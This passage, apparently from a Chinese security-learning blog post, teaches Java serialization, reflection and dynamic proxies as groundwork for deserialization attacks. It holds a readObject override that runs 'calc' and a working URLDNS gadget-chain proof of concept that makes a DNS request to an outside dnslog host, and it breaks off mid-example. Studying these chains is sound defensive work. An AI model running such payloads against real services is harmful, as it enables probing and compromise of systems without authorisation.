class="params">(ObjectInputStream ois )</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">   &#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Serialize.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">serializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span>  <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[]args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aa&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Unserialize.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializeTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span>  IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span>(Person)unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过序列化和反序列化实现弹窗</p>
<p><a href="https://github.com/frohoff/ysoserial/">frohoff&#x2F;ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. (github.com)</a></p>
<h2 id="java-反射"><a href="#java-反射" class="headerlink" title="java 反射"></a>java 反射</h2><p>正射</p>
<p>我们在编写代码时，当需要到某一个类的时候，都会先了解这个类是做什么的，然后再实例化这个类，接着实例化好的对象进行操作，这就是正射，</p>
<p>反射</p>
<p>反射就是，一开始并不知道我们要初始化的类的对象是什么，自然也无法使用new 关键字来创建对象了。</p>
<p>反射的作用：让java具有动态性</p>
<p><img src="https://s3.bmp.ovh/imgs/2024/02/19/7f083dc556181c68.png"></p>
<p><strong>1.第一阶段：代码阶段&#x2F;编译阶段</strong></p>
<p>最开始学习java时，我们都会创建一个.java后缀的文件，然后在里面写上我们的代码。运行前通过javac对其进行编译，得到一个.class后缀的字节码文件</p>
<p><strong>2.第二阶段：类加载阶段（Class类阶段）</strong></p>
<p>当执行new一个对象时，会先通过类加载器ClassLoader将我们所需要的类进行加载（此处就体现了反射），这里的类加载是以.class后缀文件为基础的。加载完后，在堆中会产生一个Class类型的对象（一个类只有一个Class对象），这个对象包含了类的完整结构信息（成员变量、构造器、成员方法等），通过这个对象得到类的结构。（Class对象就像是一面镜子，透过这个镜子看到类的结构，故形象的称之为反射）</p>
<p><strong>3.第三阶段：Runtime运行阶段</strong></p>
<p>在运行阶段，我们通过new的方式创建的对象是在堆中，该对象知道它是属于哪个Class对象。若我们得到Class对象，也同样可以通过它来创建对象，调用对象方法，操作属性等。</p>
<p>java中与反射相关的类主要有四个：</p>
<ol>
<li><p><strong>java.lang.Class</strong></p>
<p>代表一个类，Class对象表示某个类加载后在堆中的对象</p>
</li>
<li><p><strong>java.lang.reflect.Method</strong></p>
<p>代表类的方法，Method对象表示某个类的方法</p>
</li>
<li><p><strong>java.lang.reflect.Field</strong></p>
<p>代表类的成员变量，Field对象表示某个类的成员变量</p>
</li>
<li><p><strong>java.lang.reflect.Constructor</strong></p>
<p>代表类的构造方法，Constructor对象表示构造器</p>
</li>
</ol>
<p><strong>修改已有对象的属性， 动态生成对象，动态调用方法，操作内部类和私有方法。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefkectionTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        Class c=person.getClass();</span><br><span class="line">        <span class="comment">//反射就是操作Class</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class里面实例化对象</span></span><br><span class="line">        <span class="comment">// c.newInstance();</span></span><br><span class="line">        Constructor personconstructor=c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span>(Person) personconstructor.newInstance(<span class="string">&quot;abdc&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//获取类里面的属性</span></span><br><span class="line">        Field[] personfields= c.getFields();</span><br><span class="line">        <span class="keyword">for</span>(Field f:personfields)</span><br><span class="line">        &#123;</span><br><span class="line">         System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//调用类里面的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>1.Class类对象不是new出来的，而是系统创建的</strong></p>
<p>在类加载时，通过类加载器ClassLoader的loadClass方法得到该类的Class对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefkectionTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        Class c=person.getClass();</span><br><span class="line">        <span class="comment">//反射就是操作Class</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class里面实例化对象</span></span><br><span class="line">        <span class="comment">// c.newInstance();</span></span><br><span class="line">        Constructor personconstructor=c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span>(Person) personconstructor.newInstance(<span class="string">&quot;abdc&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//获取类里面的属性</span></span><br><span class="line"><span class="comment">/*        Field[] personfields= c.getFields();</span></span><br><span class="line"><span class="comment">        for(Field f:personfields)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">         System.out.println(f);</span></span><br><span class="line"><span class="comment">        &#125;*/</span></span><br><span class="line">        Field namefield=c.getField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        namefield.set(p,<span class="number">25</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//调用类里面的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.bmp.ovh/imgs/2023/10/05/80e1c006911a108c.png"></p>
<p>无法修改，由于age是私有属性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefkectionTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        Class c=person.getClass();</span><br><span class="line">        <span class="comment">//反射就是操作Class</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class里面实例化对象</span></span><br><span class="line">        <span class="comment">// c.newInstance();</span></span><br><span class="line">        Constructor personconstructor=c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span>(Person) personconstructor.newInstance(<span class="string">&quot;abdc&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//获取类里面的属性</span></span><br><span class="line"><span class="comment">/*        Field[] personfields= c.getFields();</span></span><br><span class="line"><span class="comment">        for(Field f:personfields)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">         System.out.println(f);</span></span><br><span class="line"><span class="comment">        &#125;*/</span></span><br><span class="line">        Field namefield=c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        namefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        namefield.set(p,<span class="number">25</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//调用类里面的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功修改</p>
<p>为上面person 类添加方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">action</span><span class="params">(String act)</span>&#123;</span><br><span class="line">    System.out.println(act);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method actionmethod=c.getMethod(<span class="string">&quot;action&quot;</span>,String.class);</span><br><span class="line">      actionmethod.invoke(p,<span class="string">&quot;asdasjkjbmnmbmndf&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>修改为私有后，然后调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>   <span class="keyword">void</span> <span class="title function_">action</span><span class="params">(String act)</span>&#123;</span><br><span class="line">    System.out.println(act);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method actionmethod=c.getDeclaredMethod(<span class="string">&quot;action&quot;</span>,String.class);</span><br><span class="line">      actionmethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      actionmethod.invoke(p,<span class="string">&quot;asdasjkjbmnmbmndf&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="jdk静态代理"><a href="#jdk静态代理" class="headerlink" title="jdk静态代理"></a>jdk静态代理</h2><p>代理模式（Proxy）：为其他对象提供一个代理以控制对这个对象的访问。<br>主要解决：在直接访问对象时带来的问题，比如说：要访问的对象在远程的机器上。在面向对象系统中，有些对象由于某些原因（比如对象创建开销很大，或者某些操作需要安全控制，或者需要进程外的访问），直接访问会给使用者或者系统结构带来很多麻烦，我们可以在访问此对象时加上一个对此对象的访问层。</p>
<p>代理模式的元素是：共同接口、代理对象、目标对象。</p>
<p>代理模式的行为：由代理对象执行目标对象的方法、由代理对象扩展目标对象的方法。</p>
<p>代理模式的宏观特性：对客户端只暴露出接口，不暴露它以下的架构。</p>
<p>好处多多：中间隔离了一层，更加符合开闭原则</p>
<p>在类的声明中，通过关键字extends来创建一个类的子类。一个类通过关键字implements声明自己使用一个或者多个接口。<br>extends 是继承某个类, 继承之后可以使用父类的方法, 也可以重写父类的方法; implements 是实现多个接口, 接口的方法一般为空的, 必须重写才能使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接口 IUser.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//原来功能 Userlmp.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserImpl</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserImpl</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;展示&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//UserProxy.java  与Userlmp 共同使用IUser 接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserProxy</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line">    IUser user;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserProxy</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="comment">//进行代理</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserProxy</span><span class="params">(IUser user)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.user=user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">    user.show();</span><br><span class="line">    <span class="comment">//实现对目标功能的扩展</span></span><br><span class="line">    System.out.println(<span class="string">&quot;调用了show&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ProxyTest.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        IUser user= <span class="keyword">new</span> <span class="title class_">UserImpl</span>();</span><br><span class="line">   <span class="comment">//    实现静态代理访问</span></span><br><span class="line">        IUser userProxy=<span class="keyword">new</span> <span class="title class_">UserProxy</span>(user);</span><br><span class="line">        userProxy.show();</span><br><span class="line">        &#125;&#125;      </span><br></pre></td></tr></table></figure>

<p>有时必须从几个类中派生出一个子类，继承它们所有的属性和方法。但是，Java不支持多重继承。有了接口，就可以得到多重继承的效果。</p>
<p>接口(interface)是抽象方法和常量值的定义的集合。</p>
<p>从本质上讲，接口是一种特殊的抽象类，这种抽象类中只包含常量和方法的定义，而没有变量和方法的实现。</p>
<p><strong>静态代理模式在不改变目标对象的前提下，实现了对目标对象的功能扩展。</strong><br><strong>不足：静态代理实现了目标对象的所有方法，一旦目标接口增加方法，代理对象和目标对象都要进行相应的修改，增加维护成本。</strong></p>
<h2 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h2><p>如果接口方法多，那代理必须跟着重写很多重复的代码，通过动态代理可以解决<strong>不用写代理类，直接创建代理实例，调用代理方法</strong></p>
<p>主要涉及两个类：<code>java.lang.reflect.Proxy</code> 和 <code>java.lang.reflect.InvocationHandler</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接口 IUser.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">create</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//原来功能 Userlmp.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserImpl</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserImpl</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;展示&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">create</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//UserInvocationHandler.java  动态代理</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>&#123;</span><br><span class="line">    IUser user;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">(IUser user)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.user=user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//invoke 回调函数，确定调用那个方法</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy,Method method,Object[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了&quot;</span>+method.getName());</span><br><span class="line">        method.invoke(user,args);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ProxyTest.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        IUser user= <span class="keyword">new</span> <span class="title class_">UserImpl</span>();</span><br><span class="line">        <span class="comment">//动态代理</span></span><br><span class="line">        <span class="comment">//要代理的接口,要做的事情</span></span><br><span class="line">        InvocationHandler userinvocationhandler=<span class="keyword">new</span> <span class="title class_">UserInvocationHandler</span>(user);</span><br><span class="line">        IUser userProxy=(IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(),user.getClass().getInterfaces(),</span><br><span class="line">        userinvocationhandler);</span><br><span class="line">        userProxy.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>动态代理一种设计模式，不修改原有类，增加功能，</p>
<p>动态代理的意义，少修改代码，适配强，在反序列化漏洞中的作用</p>
<p>readObject&gt;反序列化自动执行，invoke&gt;有函数调用，</p>
<p>拼接两条链，任意变固定</p>
<p><a href="https://www.jianshu.com/p/8ccdbe00ff06">Java代理（Proxy）模式 - 简书 (jianshu.com)</a></p>
<h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><p> URLDNS是JAVA复杂的反序列化链中最简单的一条，它不是一条真正意义上的“利⽤链”。因为它所能产生的结果不是命令执⾏，⽽是⼀次DNS请求。它使⽤Java内置的类构造，对第三⽅库没有依赖，对JDK版本没有要求，且其结果是发起一次DNS请求，不管目标有无回显，都⾮常适合用来检测是否存在反序列化漏洞</p>
<p>对链子进行分析</p>
<p>代码中最重要的三个类是HashMap,URL,URLStreamHandler。其中HashMap重写了readObject方法，URL类是里面有个hashCode()方法被HashMap的readObject()调用了，URLStreamHandler类是里面的getHostAddress被URL类里面的hashCode()方法调用</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/a1fc5b9d2a31b541.png"></p>
<p>在HashMap 中存在反序列化接口在该类的readObject方法的最后一行</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/64590666b0bd646a.png"></p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/61f192fe68fcb22f.png"></p>
<p>发现传入了一个Object类型的key，如果key为空，返回0，</p>
<p>返回 调用传入类key的hashCode 方法，而且URL类中也有URL类中含有hashCode()方法，所以是可以控制的</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/e8d2f8603bd54694.png"></p>
<p>这里说hashCode !&#x3D; -1，则直接返回hashCode，而该URL类的hashCode值被默认定义成了-1。如果等于-1，则继续往下走，我们继续跟进hashCode(this)方法</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/a7497b49e97087f1.png"></p>
<p>再跟进getHostAddress方法</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/3694b1100a74f071.png">接着跟进</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/3d267520d169e20b.png"></p>
<p>判断是否为空，最后执行InetAddress.getByName(host)获取目标ip地址，其实在网络中就是一次DNS请求</p>
<p>最后理一遍思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.java</span><br><span class="line">hashMap-&gt;readObject(),最后一行中调用hash(key)</span><br><span class="line">hashMap-&gt;hash(),key不为空，调用key.hashCode(),</span><br><span class="line">URL.java</span><br><span class="line">URL-&gt;hashCode(),hashCode的初始值为-1，若不为-1，返回 handler.hashCode(this);</span><br><span class="line">==&gt;URLStreamHandler.hashCode,进入getHostAddress(u),</span><br><span class="line">进入URLStreamHandler.getHostAddress，返还u.getHostAddress();即URL-&gt;getHostAddress()</span><br><span class="line">hostAddress = InetAddress.getByName(host);</span><br><span class="line">发起dns 请求</span><br></pre></td></tr></table></figure>

<p>构链思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashmap=new Hashmap</span><br><span class="line">url=new URL</span><br><span class="line">反射修改url1的URL的hashCode的为1</span><br><span class="line">hashMap.put(url,&quot;test&quot;)</span><br><span class="line">修改URL的hashCode为回-1</span><br></pre></td></tr></table></figure>

<p>poc 链如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> getObject(<span class="string">&quot;http://md8zyk.dnslog.cn&quot;</span>);</span><br><span class="line">        runReadobject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, String&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//这里不能发起请求，通过反射将url对象的hashcode改成不是一</span></span><br><span class="line">        filed.set(url1, <span class="number">123</span>);</span><br><span class="line">        <span class="comment">//同样这里需要通过反射改成一才能继续执行</span></span><br><span class="line">        hashMap.put(url1, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        filed.set(url1, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">runReadobject</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(outputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(outputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;  </span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">data</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line"><span class="type">ObjectOutput</span> <span class="variable">oos</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(data);  </span><br><span class="line">oos.writeObject(obj);  </span><br><span class="line">oos.flush();  </span><br><span class="line">oos.close();  </span><br><span class="line">System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span 